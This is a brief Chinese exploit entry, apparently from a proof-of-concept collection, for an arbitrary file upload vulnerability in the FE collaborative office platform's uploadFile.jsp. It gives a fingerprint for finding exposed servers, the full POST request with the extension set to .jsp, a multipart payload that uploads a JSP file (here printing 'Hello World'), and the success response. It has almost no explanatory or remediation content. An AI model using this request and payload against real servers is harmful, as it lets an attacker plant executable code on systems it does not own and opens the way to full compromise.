# FE协作办公平台uploadFile任意文件上传漏洞

FE协作办公平台uploadFile ｜ 文件上传 ｜ —
- **指纹**：`body="applyTheme/css/StyleSheet.css"`
- **请求**：`POST /common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=123.jpg&title1=%C9%CF%B4%AB%CE%C4%BC%FE&title2=%D1%A1%D4%F1%CE%C4%BC%FE&allowsize=null&extName=.jsp HTTP/1.1`

**Payload**
```
------WebKitFormBoundarylBU670lIdrGgVSWG
Content-Disposition: form-data; name="accessory"; filename="123.jsp"
Content-Type: application/octet-stream
<%out.println("Hello World1");%>
------WebKitFormBoundarylBU670lIdrGgVSWG--
```
- **响应特征**：200